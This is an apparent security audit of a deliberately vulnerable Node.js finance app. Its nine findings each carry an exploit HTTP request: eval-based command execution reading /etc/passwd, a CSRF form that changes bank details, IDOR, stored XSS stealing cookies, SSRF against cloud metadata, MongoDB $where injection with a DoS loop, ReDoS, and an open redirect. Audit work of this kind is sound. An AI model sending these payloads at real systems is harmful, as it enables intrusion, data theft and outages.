title: Server-Side JavaScript Code Injection via eval in Contributions Handler
analysis:
- Source: Untrusted HTTP POST request body parameters `preTax`, `afterTax`, and `roth` in `handleContributionsUpdate` at `app/routes/contributions.js`.
- Sanitization/Validation: None. The values are passed directly into `eval()` before any validation or type parsing takes place.
- Sink: JavaScript's global `eval()` function on lines 32-34.

Conceptual Exploit Payload:
```http
POST /contributions HTTP/1.1
Host: localhost:4000
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<valid_session_cookie>

preTax=1;require('child_process').execSync('cat /etc/passwd > /tmp/out');1&afterTax=0&roth=0
```
When `eval(req.body.preTax)` executes, the arbitrary JavaScript code is run in the server's Node.js context with the privileges of the application process, enabling full remote code execution.

title: Missing Cross-Site Request Forgery (CSRF) Protection Across State-Changing Routes
analysis:
- Source: Untrusted cross-site HTTP POST requests sent by a victim's browser session to state-changing endpoints like `/contributions`, `/profile`, `/benefits`, and `/memos`.
- Sanitization/Validation: No CSRF token generation or validation middleware is active. In `server.js` (lines 104-113), the `csrf()` middleware is completely commented out, and session cookies do not configure `sameSite: 'strict'` or `sameSite: 'lax'`.
- Sink: State-changing operations in route handlers (`handleContributionsUpdate`, `handleProfileUpdate`, `updateBenefits`, `addMemos`) perform sensitive actions based solely on the presence of the ambient session cookie.

Conceptual Exploit Payload:
An attacker hosts the following malicious web page:
```html
<html>
  <body>
    <form id="csrfForm" action="http://localhost:4000/profile" method="POST">
      <input type="hidden" name="firstName" value="Attacker" />
      <input type="hidden" name="lastName" value="Takeover" />
      <input type="hidden" name="bankRouting" value="123456#" />
      <input type="hidden" name="bankAcc" value="999999999" />
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>
```
When an authenticated user visits this malicious site, the browser includes their session cookie and executes the profile change or contribution update without the victim's awareness or consent.

title: Insecure Direct Object Reference (IDOR) in Allocations Handler
analysis:
- Source: Untrusted HTTP route parameter `userId` in `GET /allocations/:userId` from `req.params.userId`.
- Sanitization/Validation: Although `isLoggedIn` middleware is used to verify session authentication, there is no authorization check verifying that `req.params.userId` matches `req.session.userId` or that the logged-in user has permission to access that specific user's account.
- Sink: `allocationsDAO.getByUserIdAndThreshold(userId, threshold, ...)` on line 23 retrieves the specified user's retirement allocation data, stocks, bonds, funds, username, first name, and last name, rendering it in the response.

Conceptual Exploit Payload:
A regular user logged in with `userId = 2` requests:
```http
GET /allocations/1 HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<user_2_session_cookie>
```
The application executes the query for `userId = 1` and returns the confidential financial allocations and personal information of user 1 to user 2.

title: Missing Function Level Access Control on Administrative Benefits Routes
analysis:
- Source: Any authenticated user request to `GET /benefits` or `POST /benefits`.
- Sanitization/Validation: Missing `isAdmin` authorization middleware. Only `isLoggedIn` middleware is attached to the route, leaving the admin function unprotected.
- Sink: `benefitsHandler.displayBenefits` and `benefitsHandler.updateBenefits` on lines 55-56 in `app/routes/index.js`, which display all non-admin employees' benefit records and allow modifying their `benefitStartDate`.

Conceptual Exploit Payload:
A low-privileged employee logs in and sends:
```http
POST /benefits HTTP/1.1
Host: localhost:4000
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<regular_user_session_cookie>

userId=1&benefitStartDate=2099-01-01
```
The server processes the update without checking if the requester has administrative privileges, successfully altering employee benefit data and returning full lists of non-admin users.

title: Stored Cross-Site Scripting (XSS) via Disabled Template Autoescaping
analysis:
- Source: Untrusted HTTP POST body parameters such as `firstName` and `lastName` in `POST /profile` handled in `app/routes/profile.js`.
- Sanitization/Validation: None. Input is persisted directly to MongoDB via `profileDAO.updateUser` without sanitization or HTML encoding.
- Sink: Template rendering via Swig where auto-escaping has been globally disabled via `swig.setDefaults({ autoescape: false })` in `server.js` (lines 135-138), causing unescaped output in `app/views/layout.html` (e.g., `{{firstName}} {{lastName}}` on line 75) and `app/views/profile.html`.

Conceptual Exploit Payload:
Submit the following form update on `/profile`:
```http
POST /profile HTTP/1.1
Host: localhost:4000
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<valid_session_cookie>

firstName=<script>alert(document.cookie)</script>&lastName=User&bankRouting=123%23
```
When this profile is saved and the user navigates to any dashboard or profile page, `{{firstName}}` is embedded into `layout.html` raw without HTML entity encoding, resulting in stored JavaScript execution in the browser.

title: Server-Side Request Forgery (SSRF) in Research Handler
analysis:
- Source: Untrusted HTTP GET query parameters `url` and `symbol` in `displayResearch` in `app/routes/research.js`.
- Sanitization/Validation: None. There is no domain allowlisting, URL scheme validation, or IP address filtering.
- Sink: HTTP request performed by `needle.get(url, ...)` on line 16, which fetches the remote URL and streams its response body directly back to the HTTP client.

Conceptual Exploit Payload:
```http
GET /research?url=http://169.254.169.254/latest/meta-data/&symbol= HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<valid_session_cookie>
```
Or accessing internal services:
```http
GET /research?url=http://127.0.0.1:27017/&symbol= HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<valid_session_cookie>
```
The server performs an outbound GET request to the specified URL and returns the fetched internal data directly to the attacker, allowing access to internal cloud metadata credentials or internal services.

title: NoSQL Injection / Arbitrary JavaScript Evaluation in MongoDB $where Clause
analysis:
- Source: Untrusted HTTP GET query parameter `threshold` passed into `allocationsDAO.getByUserIdAndThreshold(userId, threshold, callback)` from `app/routes/allocations.js`.
- Sanitization/Validation: None. The `threshold` string is directly concatenated into a JavaScript expression string without type casting, sanitization, or escaping.
- Sink: The `$where` operator in MongoDB's `find()` query on lines 77-79 and 86 of `app/data/allocations-dao.js`.

Conceptual Exploit Payload:
```http
GET /allocations/1?threshold=1'%3B+return+1+%3D%3D+'1 HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<valid_session_cookie>
```
Or for Denial of Service / infinite loop in MongoDB engine:
```http
GET /allocations/1?threshold=0'%3Bwhile(true){}%3B' HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<valid_session_cookie>
```
When processed by MongoDB, the evaluated JavaScript statement becomes:
`this.userId == 1 && this.stocks > '1'; return 1 == '1'`
This forces the query to always evaluate to `true`, bypassing the userId filter and returning records for all users in the collection, or hanging MongoDB server threads when an infinite loop is injected.

title: Regular Expression Denial of Service (ReDoS) via Catastrophic Backtracking
analysis:
- Source: Untrusted HTTP POST body parameter `bankRouting` in `handleProfileUpdate` at `app/routes/profile.js`.
- Sanitization/Validation: None before evaluating the regular expression.
- Sink: `regexPattern.test(bankRouting)` on line 61 using the vulnerable regex pattern `/([0-9]+)+\\#/`.

Conceptual Exploit Payload:
```http
POST /profile HTTP/1.1
Host: localhost:4000
Content-Type: application/x-www-form-urlencoded
Cookie: connect.sid=<valid_session_cookie>

firstName=John&lastName=Doe&bankRouting=1111111111111111111111111111111111111111!
```
The nested quantifier `([0-9]+)+` causes exponential catastrophic backtracking when evaluated against a sequence of digits not terminated by `#`. In Node.js's single-threaded event loop, this locks CPU utilization at 100% and completely blocks the server from processing any further incoming requests.

title: Unvalidated Open Redirect via /learn Route
analysis:
- Source: Untrusted HTTP GET query parameter `url` in `app.get("/learn", ...)` at `app/routes/index.js`.
- Sanitization/Validation: None. No validation or whitelist is applied to determine if the target URL is trusted or relative.
- Sink: `res.redirect(req.query.url)` on line 72.

Conceptual Exploit Payload:
```http
GET /learn?url=https://attacker-controlled-phishing-site.example.com HTTP/1.1
Host: localhost:4000
Cookie: connect.sid=<valid_session_cookie>
```
The server responds with an HTTP 302 redirect whose `Location` header is `https://attacker-controlled-phishing-site.example.com`. An attacker can use this in phishing campaigns by abusing trust in the application's domain.
